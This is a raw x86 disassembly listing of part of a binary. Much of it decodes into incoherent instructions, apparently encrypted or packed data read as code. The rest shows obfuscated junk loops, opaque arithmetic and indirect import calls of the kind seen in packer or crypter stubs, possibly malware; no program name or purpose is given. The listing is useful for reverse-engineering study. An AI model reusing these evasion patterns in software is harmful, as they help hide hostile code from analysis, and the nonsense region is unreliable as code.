  411d2d:	clc    
  411d2e:	mov    al,ds:0x5b6a06bb
  411d33:	ret    
  411d34:	popa   
  411d35:	push   0x5d
  411d37:	xor    bl,BYTE PTR [esi+ebx*2-0x1583695]
  411d3e:	retf   0x251e
  411d41:	and    ecx,edx
  411d43:	mov    edi,0xed39b0d1
  411d48:	in     al,0xb3
  411d4a:	or     BYTE PTR [edx],ah
  411d4c:	pop    esp
  411d4d:	or     al,0xbc
  411d4f:	sbb    BYTE PTR [esp+esi*1-0x7f65460d],dl
  411d56:	pop    es
  411d57:	iret   
  411d58:	ins    BYTE PTR es:[edi],dx
  411d59:	pop    edi
  411d5a:	sbb    DWORD PTR [ebx],ecx
  411d5c:	pop    eax
  411d5d:	pop    edi
  411d5e:	nop
  411d5f:	sahf   
  411d60:	xchg   ecx,eax
  411d61:	push   ss
  411d62:	cmc    
  411d63:	xchg   esp,eax
  411d64:	and    ch,dh
  411d66:	jnp    0x411d81
  411d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d69:	daa    
  411d6a:	inc    ebp
  411d6b:	loop   0x411cee
  411d6d:	jg     0x411d8b
  411d6f:	fdivrp st(3),st
  411d71:	cmp    BYTE PTR [eax+ecx*1+0x49],dl
  411d75:	lea    esi,[ecx-0x5a8467f8]
  411d7b:	add    DWORD PTR [edi-0x3edfd1d6],eax
  411d81:	int    0x52
  411d83:	out    0x68,eax
  411d85:	mov    fs,WORD PTR [edi+0x4a]
  411d88:	mov    esi,ebp
  411d8a:	bound  eax,QWORD PTR fs:[edi+0x25]
  411d8e:	adc    eax,0x2fe06ad1
  411d93:	test   BYTE PTR [edx],0xe5
  411d96:	sbb    al,0x81
  411d98:	xor    DWORD PTR [esi+edx*8+0x2c],0x1fe203a0
  411da0:	ret    
  411da1:	ret    
  411da2:	stc    
  411da3:	and    al,0x9d
  411da5:	inc    edi
  411da6:	adc    ecx,DWORD PTR [eax]
  411da8:	outs   dx,DWORD PTR ds:[esi]
  411da9:	mov    ebx,0x960a96f7
  411dae:	arpl   WORD PTR [ebp-0x75],cx
  411db1:	sbb    DWORD PTR [esi+0x1f],0x47f62ab2
  411db8:	outs   dx,BYTE PTR ds:[esi]
  411db9:	mov    cl,0x2b
  411dbb:	clc    
  411dbc:	mov    ebp,0x26811c72
  411dc1:	scas   al,BYTE PTR es:[edi]
  411dc2:	inc    edi
  411dc3:	fs pop esi
  411dc5:	sub    esp,ebx
  411dc7:	pop    ebx
  411dc8:	push   es
  411dc9:	mov    ebp,0x2d78c865
  411dce:	dec    esp
  411dcf:	push   0xb5ebd04f
  411dd4:	sub    al,0xe3
  411dd6:	or     eax,0xdb6eb503
  411ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ddc:	int    0x3e
  411dde:	in     eax,0xfe
  411de0:	imul   eax,DWORD PTR [edx-0x58],0xffffffd9
  411de4:	cwde   
  411de5:	mov    WORD PTR [edx],gs
  411de7:	push   edx
  411de8:	or     al,BYTE PTR [ecx+0x66]
  411deb:	ret    
  411dec:	rcl    BYTE PTR [ebx-0x2c],cl
  411def:	push   es
  411df0:	div    DWORD PTR [edi]
  411df2:	sbb    bh,0xeb
  411df5:	add    DWORD PTR [edi+eiz*8],eax
  411df8:	call   0x434:0x948181e2
  411dff:	in     eax,0xaa
  411e01:	mov    esi,0xa7ef74d4
  411e06:	push   edx
  411e07:	neg    BYTE PTR [edi+esi*1-0x17]
  411e0b:	or     DWORD PTR [eax+0x24063d76],esp
  411e11:	loope  0x411ded
  411e13:	mov    dh,0xac
  411e15:	sub    DWORD PTR [ebx-0x39],0xffffffa2
  411e19:	pop    esp
  411e1a:	test   DWORD PTR [esi-0x72],0xde34e0ac
  411e21:	dec    esp
  411e22:	das    
  411e23:	push   ss
  411e24:	lahf   
  411e25:	xchg   ebp,eax
  411e26:	les    esi,FWORD PTR [esi+0x4bac48e2]
  411e2c:	jmp    0x2cb3af11
  411e31:	mov    WORD PTR [edi+0x65],es
  411e34:	lock mov bh,0xdc
  411e37:	or     ebx,DWORD PTR [ecx+0x22]
  411e3a:	inc    esp
  411e3b:	and    DWORD PTR [esi],ebp
  411e3d:	push   cs
  411e3e:	js     0x411dc2
  411e40:	xor    ecx,ebp
  411e42:	fcomp  QWORD PTR [eax+0x42]
  411e45:	(bad)  
  411e48:	shl    DWORD PTR [edi+0x7dfad92e],1
  411e4e:	xor    al,0xdd
  411e50:	rcl    ecx,1
  411e52:	adc    edi,DWORD PTR [edx]
  411e54:	popf   
  411e55:	in     al,dx
  411e56:	adc    DWORD PTR [ebx+esi*8],edx
  411e59:	nop
  411e5a:	or     BYTE PTR [ebp+0x21],cl
  411e5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e5e:	cdq    
  411e5f:	hlt    
  411e60:	idiv   DWORD PTR [ebx-0x1ba8827f]
  411e66:	push   esi
  411e67:	jmp    0x7e3b:0x528f5512
  411e6e:	mov    esp,0x5f6f22bf
  411e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e74:	mov    edi,0xdbe99682
  411e79:	fcmovnbe st,st(6)
  411e7b:	in     al,0x15
  411e7d:	icebp  
  411e7e:	add    ah,BYTE PTR [ecx+0x52]
  411e81:	cmc    
  411e82:	sti    
  411e83:	jle    0x411e91
  411e85:	xor    al,0x42
  411e87:	iret   
  411e88:	mov    edx,0xf1481af1
  411e8d:	or     eax,0x6c3b6e00
  411e92:	dec    esp
  411e93:	out    dx,eax
  411e94:	jle    0x411e9d
  411e96:	pop    ds
  411e97:	sbb    edx,DWORD PTR [ecx]
  411e99:	ret    
  411e9a:	mov    esi,0x9229f350
  411e9f:	daa    
  411ea0:	std    
  411ea1:	and    DWORD PTR [ebx-0x69f50ad2],edx
  411ea7:	clc    
  411ea8:	popf   
  411ea9:	pop    ecx
  411eaa:	adc    ebx,DWORD PTR [esi]
  411eac:	ret    0x3119
  411eaf:	cmp    dl,BYTE PTR [edi-0x59d3ef37]
  411eb5:	xor    al,0x96
  411eb7:	xor    BYTE PTR [ebx+0x33],bl
  411eba:	(bad)  
  411ebb:	stc    
  411ebc:	scas   eax,DWORD PTR es:[edi]
  411ebd:	stos   DWORD PTR es:[edi],eax
  411ebe:	add    esi,DWORD PTR [eax]
  411ec0:	aaa    
  411ec1:	jo     0x411eab
  411ec3:	jge    0x411e65
  411ec5:	(bad)  
  411ec6:	mov    bh,0x3c
  411ec8:	sub    edi,edi
  411eca:	mov    WORD PTR [eax+edi*8+0x45],ss
  411ece:	pop    edx
  411ecf:	mov    ?,WORD PTR [esp+ecx*4-0x13703910]
  411ed6:	add    dl,BYTE PTR [ecx-0x21]
  411ed9:	mov    dh,0x1b
  411edb:	in     eax,dx
  411edc:	fadd   QWORD PTR [ebx]
  411ede:	inc    esp
  411edf:	jno    0x411ef2
  411ee1:	popa   
  411ee2:	xor    al,al
  411ee4:	test   al,0x5e
  411ee6:	mov    al,ds:0xeb47bee3
  411eeb:	ret    
  411eec:	add    DWORD PTR [eax],ebx
  411eee:	pop    ecx
  411eef:	adc    dl,bl
  411ef1:	or     ebp,DWORD PTR [esi-0x73]
  411ef4:	pop    edi
  411ef5:	jo     0x411ed2
  411ef7:	ins    DWORD PTR es:[edi],dx
  411ef8:	cmp    eax,0xe77c2351
  411efd:	cwde   
  411efe:	push   es
  411eff:	jl     0x411eb1
  411f01:	(bad)  
  411f02:	leave  
  411f03:	pop    ss
  411f04:	xchg   edx,eax
  411f05:	sbb    al,0xf7
  411f07:	sbb    dh,dl
  411f09:	das    
  411f0a:	imul   edi,DWORD PTR [edi+0x5b],0x68
  411f0e:	jg     0x411f78
  411f10:	cld    
  411f11:	pop    eax
  411f12:	push   edx
  411f13:	dec    eax
  411f14:	inc    esp
  411f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f16:	xchg   edi,eax
  411f17:	lods   eax,DWORD PTR ds:[esi]
  411f18:	out    0xb2,al
  411f1a:	nop
  411f1b:	mov    ecx,DWORD PTR [edx+0x758f30d3]
  411f21:	xchg   dh,ch
  411f23:	dec    esp
  411f24:	gs jne 0x411f1d
  411f27:	leave  
  411f28:	inc    edi
  411f29:	push   ds
  411f2a:	int    0x7b
  411f2c:	add    BYTE PTR cs:[edx+0x43],cl
  411f30:	and    BYTE PTR [esi+0x4d239986],cl
  411f36:	mov    bh,0x37
  411f38:	cmp    eax,DWORD PTR ds:0xce07fc85
  411f3e:	and    cl,cl
  411f40:	das    
  411f41:	fist   DWORD PTR [esi]
  411f43:	xor    BYTE PTR [ebx+0x52efc174],dl
  411f49:	inc    edi
  411f4a:	jmp    0x9ae5:0xf68565bf
  411f51:	rcl    DWORD PTR [ecx+ebp*1-0x1b],cl
  411f55:	(bad)  
  411f56:	je     0x411f98
  411f58:	js     0x411fbc
  411f5a:	inc    edi
  411f5b:	mov    DWORD PTR [esi-0x3ba6efde],0x24c92265
  411f65:	fnstcw WORD PTR [edi]
  411f67:	mov    WORD PTR [ebx-0xe8299f0],?
  411f6d:	sub    eax,DWORD PTR [eax]
  411f6f:	sub    eax,0xffffffee
  411f72:	lods   eax,DWORD PTR ds:[esi]
  411f73:	push   ebx
  411f74:	cld    
  411f75:	cwde   
  411f76:	outs   dx,DWORD PTR ds:[esi]
  411f77:	repnz sti 
  411f79:	jns    0x411f2a
  411f7b:	mov    dl,0xf2
  411f7d:	jmp    0x6bc27ac5
  411f82:	stos   BYTE PTR es:[edi],al
  411f83:	mov    ds:0x5d086d4b,al
  411f88:	cmp    esp,DWORD PTR [ebx]
  411f8a:	sub    ebx,esi
  411f8c:	mov    al,ds:0x1c6c59c4
  411f91:	mov    esi,DWORD PTR ds:0x7e378fbe
  411f97:	and    al,0x23
  411f99:	daa    
  411f9a:	(bad)  
  411f9b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f9d:	push   ebx
  411f9e:	mov    es,WORD PTR [ecx-0x6f43bbda]
  411fa4:	nop
  411fa5:	stc    
  411fa6:	cdq    
  411fa7:	aaa    
  411fa8:	lods   al,BYTE PTR ds:[esi]
  411fa9:	jne    0x411fd2
  411fab:	xor    BYTE PTR [ecx],ah
  411fad:	iret   
  411fae:	mov    esp,0x92430af4
  411fb3:	hlt    
  411fb4:	dec    ebp
  411fb5:	pop    ebp
  411fb6:	adc    DWORD PTR [ecx+edi*2+0x65cbe05c],0x2174a29a
  411fc1:	call   0xc6fcc0d3
  411fc6:	out    0x88,eax
  411fc8:	mov    ch,0x9d
  411fca:	jge    0x411fbc
  411fcc:	iret   
  411fcd:	stos   BYTE PTR es:[edi],al
  411fce:	xor    DWORD PTR [eax-0x165ec0ab],ebx
  411fd4:	out    0xe5,al
  411fd6:	or     DWORD PTR [edi],ecx
  411fd8:	inc    edx
  411fd9:	push   edx
  411fda:	or     eax,0x5e9cef20
  411fdf:	pop    esp
  411fe0:	pop    es
  411fe1:	and    eax,0xf3b2bfa4
  411fe6:	dec    esi
  411fe7:	aad    0x89
  411fe9:	sub    eax,0xbb665093
  411fee:	nop
  411fef:	dec    esp
  411ff0:	inc    esp
  411ff1:	adc    DWORD PTR [esp+edx*2-0x6c],ecx
  411ff5:	call   0xfb1b:0x590f8c4f
  411ffc:	inc    edi
  411ffd:	cdq    
  411ffe:	adc    cl,0x2f
  412001:	sub    dl,dh
  412003:	and    al,0x37
  412005:	dec    esi
  412006:	in     eax,0xaf
  412008:	sbb    ah,BYTE PTR [esi-0x6a]
  41200b:	sub    DWORD PTR [esi+0x6e],ecx
  41200e:	cld    
  41200f:	out    0xda,eax
  412011:	cmp    BYTE PTR [edi-0xb],al
  412014:	and    DWORD PTR ds:0xc6e64d46,esi
  41201a:	xor    eax,0xccba589e
  41201f:	adc    al,0x33
  412021:	mov    ch,0xe2
  412023:	aad    0x97
  412025:	or     bl,BYTE PTR [edx]
  412027:	sbb    BYTE PTR [esi+0x48],ch
  41202a:	or     BYTE PTR [ebp+eiz*2+0x72],ah
  41202e:	mov    eax,0xbfc968ed
  412033:	ins    DWORD PTR es:[edi],dx
  412034:	xor    DWORD PTR [edx+edx*2],ebx
  412037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412038:	call   FWORD PTR [ecx]
  41203a:	loope  0x411fca
  41203c:	sub    ah,BYTE PTR [edi]
  41203e:	ret    
  41203f:	mov    cl,0xa2
  412041:	push   esi
  412042:	in     al,dx
  412043:	jle    0x412018
  412045:	not    DWORD PTR [eax]
  412047:	cli    
  412048:	mov    edx,0x2d8c7e52
  41204d:	push   0xffffffbf
  41204f:	jmp    0xaec7:0xf493abe7
  412056:	dec    esp
  412057:	mov    ecx,0x31f6125c
  41205c:	(bad)  [edx+0x5321c289]
  412062:	shr    DWORD PTR [ebx+0x62],1
  412065:	push   esi
  412066:	fistp  DWORD PTR [eax+0x670492a0]
  41206c:	inc    ebp
  41206d:	cmp    BYTE PTR [edi-0x4e],al
  412070:	cmp    DWORD PTR [edi+0x65ec62af],eax
  412076:	fild   WORD PTR [edx-0x69b77871]
  41207c:	mov    ecx,DWORD PTR [ebx+edi*1-0x3a933ba1]
  412083:	cmp    DWORD PTR [eax-0xcacb7a0],0x980b842b
  41208d:	add    al,0xb4
  41208f:	add    BYTE PTR [edx-0x4a4566b8],bl
  412095:	scas   eax,DWORD PTR es:[edi]
  412096:	mov    ds:0x85a2b796,al
  41209b:	pop    ss
  41209c:	push   edi
  41209d:	aam    0xd7
  41209f:	cmp    DWORD PTR [edx-0x648974f3],esp
  4120a5:	sar    BYTE PTR [edx+ebp*1-0x1ffdc868],cl
  4120ac:	aaa    
  4120ad:	lock xor al,0x61
  4120b0:	mov    ecx,0xe728bf18
  4120b5:	adc    bh,bh
  4120b7:	mov    ?,ebx
  4120b9:	jp     0x4120eb
  4120bb:	cdq    
  4120bc:	mov    esp,0x4460ccd9
  4120c1:	pop    eax
  4120c2:	repz shr ebx,1
  4120c5:	pop    edx
  4120c6:	xchg   cl,bl
  4120c8:	out    dx,al
  4120c9:	test   eax,0xb7e8736b
  4120ce:	in     eax,0xe
  4120d0:	cmp    al,0x69
  4120d2:	(bad)  
  4120d3:	fimul  DWORD PTR [ebx+0x2a]
  4120d6:	sbb    ecx,DWORD PTR [eax+0x20]
  4120d9:	arpl   WORD PTR [ebx],di
  4120db:	mov    al,ds:0xe497a426
  4120e0:	outs   dx,DWORD PTR ds:[esi]
  4120e1:	or     dh,BYTE PTR [edx+0x18]
  4120e4:	je     0x4120ed
  4120e6:	lea    ebp,[ecx-0x7c]
  4120e9:	shr    ebp,0x94
  4120ec:	xor    edx,DWORD PTR [eax-0x6b0430f9]
  4120f2:	mov    eax,0xf29d2738
  4120f7:	push   edi
  4120f8:	(bad)  
  4120f9:	out    dx,al
  4120fa:	pop    ss
  4120fb:	outs   dx,BYTE PTR ds:[esi]
  4120fc:	jmp    0x412133
  4120fe:	add    DWORD PTR [ebx],0x7b
  412101:	or     ecx,DWORD PTR [ebp-0x71]
  412104:	retf   
  412105:	sub    al,0x66
  412107:	in     al,dx
  412108:	push   esp
  412109:	mov    ebx,0x3fa18417
  41210e:	dec    ebp
  41210f:	xchg   ecx,eax
  412110:	inc    esi
  412111:	(bad)  
  412113:	mov    al,ds:0x9641392d
  412118:	or     al,BYTE PTR [esi+edx*1+0x42]
  41211c:	(bad)  
  41211d:	(bad)  
  41211e:	mov    esi,0xa07884bf
  412123:	out    0x23,eax
  412125:	and    al,0xbb
  412127:	ror    dl,cl
  412129:	jae    0x412186
  41212b:	jmp    0xef25570a
  412130:	adc    ebx,DWORD PTR ds:0x62b30cc0
  412136:	aad    0xcd
  412138:	lahf   
  412139:	push   ss
  41213a:	lods   eax,DWORD PTR ds:[esi]
  41213b:	mov    dh,BYTE PTR [edx]
  41213d:	push   esi
  41213e:	cli    
  41213f:	aam    0x4e
  412141:	outs   dx,DWORD PTR ds:[esi]
  412142:	stos   DWORD PTR es:[edi],eax
  412143:	daa    
  412144:	repnz test al,0x3a
  412147:	add    BYTE PTR [ebx-0x1a],bl
  41214a:	jno    0x412134
  41214c:	sub    dh,BYTE PTR [edx-0x2d]
  41214f:	clc    
  412150:	inc    edi
  412151:	ss pop ss
  412153:	(bad)  
  412154:	call   0x6b46:0x67d7358a
  41215b:	test   al,0x4b
  41215d:	inc    esi
  41215e:	dec    ecx
  41215f:	push   es
  412160:	call   0x6c280273
  412165:	sub    edx,DWORD PTR [esi+0x15]
  412168:	mov    ds:0x8d69fab2,al
  41216d:	xor    eax,0x2a5b63b2
  412172:	add    DWORD PTR [esi],esp
  412174:	push   edi
  412175:	sbb    eax,0xc022a59
  41217a:	rcl    cl,0xb9
  41217d:	adc    al,0x4e
  41217f:	rcr    DWORD PTR [esi-0x78a30f0d],1
  412185:	cdq    
  412186:	dec    esi
  412187:	lahf   
  412188:	mov    DWORD PTR [ebp-0x5c8fd944],ebx
  41218e:	stc    
  41218f:	xchg   ebx,eax
  412190:	mov    ecx,0xb2f49b79
  412195:	inc    edi
  412196:	xor    ah,BYTE PTR [ebp+0x6d]
  412199:	rol    ecx,0xf4
  41219c:	adc    DWORD PTR [ebx+0x468eb2b1],ebp
  4121a2:	stos   BYTE PTR es:[edi],al
  4121a3:	jns    0x4121a1
  4121a5:	mov    dl,0xd1
  4121a7:	push   ebx
  4121a8:	sbb    eax,0xefd87d68
  4121ad:	mov    edi,0x7fee6e14
  4121b2:	shl    BYTE PTR [edi+0x60a76a6e],0x57
  4121b9:	sub    ch,BYTE PTR [eax+0x2dc5c4d1]
  4121bf:	inc    ebp
  4121c0:	mov    dh,0x5d
  4121c2:	mov    ds:0x441ed1b4,eax
  4121c7:	inc    esi
  4121c8:	fdiv   DWORD PTR [esi-0x5e]
  4121cb:	int3   
  4121cc:	frstor [ebx-0x64]
  4121cf:	test   BYTE PTR ds:0xe6930d17,ah
  4121d5:	jno    0x412196
  4121d7:	cmp    ah,BYTE PTR [edi+ecx*1-0x44]
  4121db:	push   edx
  4121dc:	cmp    eax,0x757d647c
  4121e1:	(bad)  
  4121e2:	fstp   DWORD PTR [ebp-0x20]
  4121e5:	shl    esi,cl
  4121e7:	and    DWORD PTR [ebx-0x12],0x26
  4121eb:	ror    ah,cl
  4121ed:	sbb    eax,0x790a4fa8
  4121f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f3:	inc    ebp
  4121f4:	lds    ecx,FWORD PTR [edx]
  4121f6:	idiv   BYTE PTR [ecx]
  4121f8:	in     eax,0xc9
  4121fa:	es dec al
  4121fd:	xchg   DWORD PTR [edi+0x10c9a1e9],ebp
  412203:	enter  0xfdd9,0x63
  412207:	sahf   
  412208:	in     al,0x2e
  41220a:	lea    esp,[eax+0x20d2f582]
  412210:	adc    DWORD PTR [eax],edx
  412212:	dec    ebp
  412213:	and    eax,DWORD PTR [edi]
  412215:	into   
  412216:	into   
  412217:	imul   esp,DWORD PTR [esi+0x16963ba0],0x770745dd
  412221:	les    esp,FWORD PTR [edi]
  412223:	dec    BYTE PTR [ecx+eiz*8]
  412226:	xchg   esp,eax
  412227:	aaa    
  412228:	sbb    al,0xcc
  41222a:	jo     0x412266
  41222c:	mov    esi,0x93be9c5f
  412231:	mov    ebp,edi
  412233:	push   ecx
  412234:	cs add eax,0xb03904c9
  41223a:	jecxz  0x4122a2
  41223c:	add    dh,BYTE PTR [edx]
  41223e:	shl    BYTE PTR [eax+0x5f],cl
  412241:	(bad)  [ebp-0x3d6b087a]
  412247:	sub    esp,esi
  412249:	neg    DWORD PTR [edi-0xe9a3bd2]
  41224f:	push   0x56
  412251:	jb     0x4122c2
  412253:	jmp    0xd6aa1ad5
  412258:	inc    esp
  412259:	mov    dh,0xc2
  41225b:	rcr    DWORD PTR [edi],1
  41225d:	inc    esi
  41225e:	fdivp  st(7),st
  412260:	adc    ecx,edx
  412262:	pop    ecx
  412263:	push   eax
  412264:	repz add eax,DWORD PTR [di-0x20]
  412269:	push   edi
  41226a:	mov    WORD PTR [eax],?
  41226c:	push   esi
  41226d:	pusha  
  41226e:	push   0x56981301
  412273:	pop    ebp
  412274:	repz and bh,BYTE PTR [ecx+0x6db551ce]
  41227b:	add    eax,0x38017956
  412280:	or     bl,BYTE PTR [ecx-0x69]
  412283:	fcmovnbe st,st(6)
  412285:	sar    BYTE PTR [ebx],0x75
  412288:	jmp    FWORD PTR [edi-0xd82a6a1]
  41228e:	js     0x4122f5
  412290:	in     eax,0xd1
  412292:	mov    DWORD PTR [ebx],eax
  412294:	mov    bl,0x19
  412296:	aas    
  412297:	test   eax,0x6eb0c5db
  41229c:	es pop esi
  41229e:	or     cl,BYTE PTR [eax*2+0x6ce806a9]
  4122a5:	jl     0x4122a2
  4122a7:	push   ecx
  4122a8:	ret    0x8509
  4122ab:	rcl    BYTE PTR [eax+0x7cab3635],cl
  4122b1:	cmp    ecx,DWORD PTR [edx]
  4122b3:	dec    eax
  4122b4:	pop    ebp
  4122b5:	jmp    0x26896f3
  4122ba:	in     al,dx
  4122bb:	in     al,dx
  4122bc:	xor    ebx,DWORD PTR [eax+esi*1]
  4122bf:	jp     0x412299
  4122c1:	aam    0x47
  4122c3:	or     al,0xab
  4122c5:	jp     0x41226e
  4122c7:	or     dh,BYTE PTR [esi-0x26]
  4122ca:	pusha  
  4122cb:	sar    DWORD PTR [ecx-0x33a80912],1
  4122d1:	push   ds
  4122d2:	xchg   ebp,eax
  4122d3:	fidivr DWORD PTR [ebx]
  4122d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122d6:	sub    BYTE PTR [esi],dh
  4122d8:	push   esi
  4122d9:	add    BYTE PTR [esi],ch
  4122db:	int    0x38
  4122dd:	mov    ecx,DWORD PTR [edx+eiz*1-0x19611a33]
  4122e4:	sub    esi,DWORD PTR [ebp-0xa]
  4122e7:	mov    ds:0x876ab80d,al
  4122ec:	pop    edx
  4122ed:	dec    esp
  4122ee:	stos   DWORD PTR es:[edi],eax
  4122ef:	stc    
  4122f0:	xchg   edx,eax
  4122f1:	mov    esp,0x50f36807
  4122f6:	add    eax,0x7832d863
  4122fb:	(bad)  
  4122fc:	retf   0xec9d
  4122ff:	mov    BYTE PTR [edx+ecx*8+0x3b],ch
  412303:	and    eax,0xda36d84a
  412308:	or     al,0x6b
  41230a:	in     eax,dx
  41230b:	outs   dx,DWORD PTR ds:[esi]
  41230c:	imul   ebx,DWORD PTR [esi],0x71
  41230f:	fsub   QWORD PTR [ebp+0x68aba34e]
  412315:	dec    esi
  412316:	fwait
  412317:	push   0xffffffd1
  412319:	popf   
  41231a:	cmp    al,0xb7
  41231c:	(bad)  
  41231d:	shl    esp,cl
  41231f:	push   ds
  412320:	or     al,0xd5
  412322:	ficomp WORD PTR [edx+ebp*2+0x27]
  412326:	add    bh,dl
  412328:	jp     0x41237e
  41232a:	inc    esp
  41232b:	mov    dh,0xf7
  41232d:	xor    al,0x46
  41232f:	fstp   DWORD PTR [edi]
  412331:	idiv   esp
  412333:	mul    al
  412335:	stos   DWORD PTR es:[edi],eax
  412336:	xor    bh,BYTE PTR [edx]
  412338:	inc    ebp
  412339:	aad    0xf3
  41233b:	sbb    BYTE PTR [ebx-0x4d],bl
  41233e:	xor    DWORD PTR [eax],ecx
  412340:	int    0x7d
  412342:	sti    
  412343:	aas    
  412344:	push   ebx
  412345:	pop    eax
  412346:	std    
  412347:	test   al,0x3b
  412349:	cmc    
  41234a:	pop    edx
  41234b:	(bad)  
  41234c:	sbb    ebp,DWORD PTR [edx]
  41234e:	mov    ch,0x25
  412350:	js     0x4123c4
  412352:	pop    eax
  412353:	fidiv  DWORD PTR [eax]
  412355:	aaa    
  412356:	bound  edx,QWORD PTR [ebx+0x8558be4]
  41235c:	and    DWORD PTR ds:0x42b21a,0x0
  412366:	jmp    0x41237a
  41236b:	xor    ebx,ebx
  41236d:	xor    ebx,DWORD PTR ds:0x42b21a
  412373:	inc    ebx
  412374:	mov    DWORD PTR ds:0x42b21a,ebx
  41237a:	cmp    DWORD PTR ds:0x42b21a,0x18
  412381:	jae    0x4123c1
  412387:	cmp    DWORD PTR ds:0x42b21a,0x4
  41238e:	jg     0x4123c1
  412394:	jmp    0x4123a2
  412399:	push   DWORD PTR [ebp-0x18]
  41239c:	call   DWORD PTR ds:0x42b316
  4123a2:	cmp    DWORD PTR ds:0x42b21a,0x3
  4123a9:	jne    0x4123bc
  4123af:	mov    ebx,DWORD PTR ds:0x42b21a
  4123b5:	inc    ebx
  4123b6:	mov    DWORD PTR ds:0x42b21a,ebx
  4123bc:	jmp    0x41236b
  4123c1:	mov    ebx,DWORD PTR [ebp-0x54]
  4123c4:	mov    DWORD PTR ds:0x42b21a,0x6966
  4123ce:	add    edx,0x64f880
  4123d4:	or     edx,ebx
  4123d6:	mov    DWORD PTR [ebp-0x54],edx
  4123d9:	mov    edx,DWORD PTR [ebp+0x8]
  4123dc:	xor    DWORD PTR ds:0x42b1b2,edx
  4123e2:	mov    ebx,DWORD PTR [ebp-0x50]
  4123e5:	and    DWORD PTR ds:0x42b226,0x42b18e
  4123ef:	add    edx,ecx
  4123f1:	sbb    DWORD PTR ds:0x42b1ee,0x42b196
  4123fb:	xor    edx,ebx
  4123fd:	mov    DWORD PTR [ebp-0x50],edx
  412400:	mov    DWORD PTR ds:0x42b226,0x2b16
  41240a:	mov    edx,DWORD PTR [ebp+0x8]
  41240d:	and    DWORD PTR ds:0x42b19e,0x0
  412417:	mov    ebx,DWORD PTR ds:0x42b19e
  41241d:	inc    ebx
  41241e:	mov    DWORD PTR ds:0x42b19e,ebx
  412424:	cmp    DWORD PTR ds:0x42b19e,0xc
  41242b:	ja     0x41246b
  412431:	jmp    0x412444
  412436:	push   DWORD PTR [ebp-0x10]
  412439:	push   0x7c16
  41243e:	call   DWORD PTR ds:0x42b31a
  412444:	cmp    DWORD PTR ds:0x42b19e,0xb
  41244b:	jne    0x41245e
  412451:	mov    ebx,DWORD PTR ds:0x42b19e
  412457:	inc    ebx
  412458:	mov    DWORD PTR ds:0x42b19e,ebx
  41245e:	cmp    DWORD PTR ds:0x42b19e,0x13
  412465:	jb     0x412417
  41246b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41246e:	add    edx,edi
  412470:	and    edx,ebx
  412472:	mov    ebx,DWORD PTR ds:0x42b206
  412478:	add    DWORD PTR ds:0x42b1c6,ebx
  41247e:	mov    DWORD PTR [ebp-0x4c],edx
  412481:	add    DWORD PTR ds:0x42b19a,0x5c82
  41248b:	mov    edx,DWORD PTR [ebp+0x8]
  41248e:	mov    ebx,DWORD PTR [ebp-0x48]
  412491:	lea    edx,[ebx+edx*1+0x241fcdf]
  412498:	mov    DWORD PTR [ebp-0x48],edx
  41249b:	mov    edx,DWORD PTR [ebp+0x8]
  41249e:	mov    ebx,0xfa5e1524
  4124a3:	sub    ebx,edx
  4124a5:	add    ebx,DWORD PTR [ebp-0x44]
  4124a8:	mov    DWORD PTR [ebp-0x44],ebx
  4124ab:	mov    edx,DWORD PTR [ebp+0x8]
  4124ae:	xor    edx,eax
  4124b0:	add    edx,esi
  4124b2:	jne    0x40fdfa
  4124b8:	jmp    0x419191
  4124bd:	mov    edx,DWORD PTR [ebp-0xc]
  4124c0:	sub    edx,esi
  4124c2:	xor    edx,eax
  4124c4:	mov    DWORD PTR [ebp-0x5c],edx
  4124c7:	mov    edx,DWORD PTR [ebp-0x10]
  4124ca:	mov    ebx,DWORD PTR [ebp-0x8]
  4124cd:	xor    edx,eax
  4124cf:	xor    ebx,eax
  4124d1:	sub    edx,ebx
  4124d3:	sub    edx,esi
  4124d5:	xor    edx,eax
  4124d7:	mov    DWORD PTR [ebp-0x10],edx
  4124da:	mov    edx,DWORD PTR [ebp-0x14]
  4124dd:	mov    DWORD PTR [ebp+0x8],edx
  4124e0:	jmp    0x4148b5
  4124e5:	mov    edx,DWORD PTR [ebp+0x8]
  4124e8:	mov    ebx,DWORD PTR [ebp-0x8]
  4124eb:	xor    edx,eax
  4124ed:	xor    ebx,eax
  4124ef:	sub    edx,ebx
  4124f1:	sub    edx,esi
  4124f3:	xor    edx,eax
  4124f5:	mov    DWORD PTR [ebp+0x8],edx
  4124f8:	mov    edx,DWORD PTR [ebp+0x8]
  4124fb:	mov    ebx,DWORD PTR [ebp-0x58]
  4124fe:	add    edx,0x5708e2
  412504:	imul   edx,ebx
  412507:	mov    DWORD PTR [ebp-0x58],edx
  41250a:	mov    edx,DWORD PTR [ebp+0x8]
  41250d:	mov    ebx,DWORD PTR [ebp-0x54]
  412510:	add    edx,0x64f880
  412516:	or     edx,ebx
  412518:	mov    DWORD PTR [ebp-0x54],edx
  41251b:	mov    edx,DWORD PTR [ebp+0x8]
  41251e:	mov    ebx,DWORD PTR [ebp-0x50]
  412521:	add    edx,ecx
  412523:	xor    edx,ebx
  412525:	mov    DWORD PTR [ebp-0x50],edx
  412528:	mov    edx,DWORD PTR [ebp+0x8]
  41252b:	mov    ebx,DWORD PTR [ebp-0x4c]
  41252e:	add    edx,edi
  412530:	and    edx,ebx
  412532:	mov    DWORD PTR [ebp-0x4c],edx
  412535:	mov    edx,DWORD PTR [ebp+0x8]
  412538:	mov    ebx,DWORD PTR [ebp-0x48]
  41253b:	lea    edx,[ebx+edx*1+0x241fcdf]
  412542:	mov    DWORD PTR [ebp-0x48],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,0xfa5e1524
  41254d:	sub    ebx,edx
  41254f:	add    ebx,DWORD PTR [ebp-0x44]
  412552:	mov    DWORD PTR [ebp-0x44],ebx
  412555:	jmp    0x4148b5
  41255a:	xlat   BYTE PTR ds:[ebx]
  41255b:	push   ss
  41255c:	xchg   BYTE PTR [ebx-0x7e],dh
  41255f:	repz xchg edx,eax
